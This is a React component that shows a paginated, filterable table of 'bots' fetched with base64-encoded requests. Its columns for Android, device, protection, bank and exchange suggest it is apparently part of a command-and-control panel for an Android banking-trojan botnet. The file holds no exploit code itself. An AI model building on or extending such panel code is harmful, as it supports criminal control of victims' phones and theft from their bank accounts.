import React from 'react';
import BotsTbody from './BotsTbody';
import SettingsContext from './../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';


function GetPageItem(i, currentPage, onLoadJson) {
    if(i==currentPage) {
        return (
            <li class="disable-select page-item active"><span class="page-link">{i}</span></li>
        );
    }
    else {
        return (
            <li class="disable-select page-item"><a class="page-link" onClick={() => onLoadJson(i)} pageId={i}>{i}</a></li>
        );
    }
}

class BotsTable extends React.Component {
    
    constructor(props) {
        super(props);
        this.state = {
          error: null,
          isLoaded: false,
          pages: 1,
          botslist: [],
          countBots: 0,
          currentPage: 1
        };

        this.onLoadJson = this.onLoadJson.bind(this);
    }
    
    componentDidMount() {
        this.onLoadJson(1);
    }

    autoUpdate() {
        if(SettingsContext.autoUpdateEnable)
            this._timer = setInterval(() => this.onLoadJson(this.state.currentPage), SettingsContext.autoUpdateDelay);
    }

    componentWillReceiveProps(newProps) {
        this.onLoadJson(this.state.currentPage);
    }

    componentWillUnmount() {
        this.DisableTimer();
    }

    DisableTimer() {
        if (this._timer) {
            clearInterval(this._timer);
            this._timer = null;
        }
    }
    

    onLoadJson (currState) {
        this.DisableTimer();

        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"info_table_clientele","num_page":"' + currState +
                    '","filter_table":"' + SettingsContext.BotsFilterMode + 
                    '","count_per_page":"' + SettingsContext.BotsPerPage + 
                    '","filter_table2":"' + SettingsContext.findID + '|'+  SettingsContext.findTAG + '|'+  SettingsContext.findAPP + 
                    '"}'
                ).toString('base64')
            }
        });

        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                }
                else {
                    this.setState({
                        isLoaded: true,
                        pages: result.PS,
                        botslist: result.table,
                        countBots: result.CB,
                        currentPage: result.CP
                    });
                }
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading bots table. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));

        this.autoUpdate();
    }


    FaCheckBox() {
        return this.state.checked ? 'far fa-check-square' : 'far fa-square';
    }
    toggleChange = () => {
      
        if(!(SettingsContext.SelectedBots.indexOf(0) > -1)) {
            this.SelectAllBots(this);
         //   alert(SettingsContext.SelectedBots);
            
        }
        else {
           
            this.clearSelection(this);
        }
    }

    clearSelection() {
        SettingsContext.SelectedBots = [];
        SettingsContext.SelectedBots.remove(0);
        this.setState({checked: false});
        this.forceUpdate();
    }

    SelectAllBots() {
      //  alert( SettingsContext.BotsOnPage);
        SettingsContext.SelectedBots = SettingsContext.BotsOnPage;
        SettingsContext.SelectedBots.push(0);
        this.setState({checked: true});
        this.forceUpdate();
    }
    
    render () {
        const { error, isLoaded, pages, botslist, currentPage } = this.state;
        if (error) {
            return <div>Error: {error}</div>;
        }
        else if (!isLoaded) {
            return <div class="load-4"><div class="ring-1"></div></div>
        }
        else {
            var pageElements = [];
            for (var i = 1; i <= pages; i++)
            {
                pageElements.push(GetPageItem(i, currentPage, this.onLoadJson.bind(this)));
            }

            const tdw = {
                padding: '0px',
                textAlign: 'center',
                fontSize: '26px',
            }

            
            const tdw2 = {
                padding: '0px',
                textAlign: 'center',
                fontSize: '26px',
                width: '200px',
                minWidth: '100px'
            
            }
 
            const tdw3 = {
                padding: '0px',
                textAlign: 'center',
                fontSize: '26px'
                
            
            }
            

            const IconsClass = {
                width: '100px'
            }

            SettingsContext.BotsOnPage = [];

            botslist.forEach(bott => {
                SettingsContext.BotsOnPage.push(bott.ID);   
            });
//client_table_style table table-striped table-dark table-hover 
            return (
                <React.Fragment>

                    <button type="button" class="total fab fa-android  btn btn-outline-secondary"> Total: {this.state.countBots} </button> 

                    <table class="table table-hover client_table_style">
                        <thead class="thead-light">
                            <tr>
                            <th scope="col" style={({textAlign:'left', width:'0px'})}> <i style={({marginLeft:'5px'})} class={this.FaCheckBox()} onClick={this.toggleChange.bind(this)} /></th>
                            <th scope="col" style={tdw3}><i class="fa fa-users" ></i></th>
                            <th scope="col" style={tdw}><i class="far fa-flag"></i></th>
                            <th scope="col" style={tdw}><i class="fal fa-tag"></i></th>
                            <th scope="col" style={tdw}><i class="fab fa-android"></i></th>
                            <th scope="col" style={tdw}><i class="far fa-mobile"></i></th>
                            <th scope="col" style={tdw}><i class="fas fa-shield-alt"></i></th>
                            <th scope="col" style={tdw}><i class="fas fa-university"></i></th>
                            <th scope="col" style={tdw}><i class="far fa-exchange"></i></th>
                            <th scope="col" style={tdw}><i class="fa fa-calendar-plus"></i></th>
                            <th scope="col" style={tdw}><i class="fal fa-cogs"></i></th>
                            <th scope="col" style={tdw2}><i class="fal fa-comment"></i></th>
                            </tr>
                        </thead>
                        <BotsTbody BotListForceUpdate={this.props.BotListForceUpdate} botList={botslist} />
                    </table>
                    <nav>
                    <ul class="justify-content-center pagination" style={({marginTop:'0px'})}>
                        {pageElements}
                    </ul>
                    </nav>
                </React.Fragment>
            );
        }
    }
}

export default BotsTable;